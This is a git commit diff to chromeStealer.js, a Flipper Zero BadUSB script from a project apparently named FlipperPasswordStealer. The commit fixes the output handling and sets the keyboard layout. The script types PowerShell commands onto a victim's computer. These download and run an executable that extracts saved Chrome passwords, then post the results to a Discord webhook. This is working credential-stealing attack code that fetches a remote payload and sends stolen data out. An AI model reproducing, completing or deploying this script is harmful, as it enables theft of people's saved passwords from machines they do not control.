3df5e3b23030c972584fe039ca736343d67d550a
Riad Zaid <r.zaid@student.tudelft.nl>
2024-05-06 19:03:47 +0200

    Fixed bug + layout

--- chromeStealer.js
+++ chromeStealer.js
@@ -1,12 +1,12 @@
 let badusb = require("badusb");
 
 let script=[
-   "$webhookUrl = '<discordwebhook>';",
+   "$webhookUrl = '<discordWebhook>';",
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chromeStealer.exe';",
    "$exePath = '.\\chromeStealer.exe';",
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
    "$commandOutput = & $exePath;",
-   "$commandOutput = & '.\\chromeStealer.exe';",
+   "$commandOutput = & '.\\chromeStealer.exe' | Out-String;",
     "if ($commandOutput.Length -gt 2000) {$commandOutput = $commandOutput.Substring(0, 2000)}",
     "$discordData = @{",
     "    'username' = 'Flipper';",
@@ -21,7 +21,7 @@ for (let i = 0; i < script.length; i++) {
     command += script[i];
 }
 
-badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
+badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/en-US.kl" });
 print("Waiting for connection");
 while (!badusb.isConnected()) {
     delay(1000);
